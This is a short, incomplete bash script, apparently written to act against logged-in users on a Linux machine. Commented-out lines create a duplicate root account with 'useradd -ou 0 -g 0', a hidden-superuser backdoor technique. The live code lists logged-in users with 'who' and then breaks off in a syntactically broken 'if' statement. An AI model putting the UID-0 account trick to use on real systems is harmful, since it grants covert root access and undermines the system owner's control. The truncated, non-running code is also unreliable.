#!/bin/bash

#Check if you didn't pass a user to be root
#[[ -z $1 ]] && echo -e "usage:\n./FuckUsers <user_to_be_root";

#creating a root user

#useradd -ou 0 -g 0 $1;
#echo "created user $1 with root privileges, maybe you should do a passwd $1"

users=(`who | cut -d ' ' -f1`)
for i in "${users[@]}"
do
	if "
done
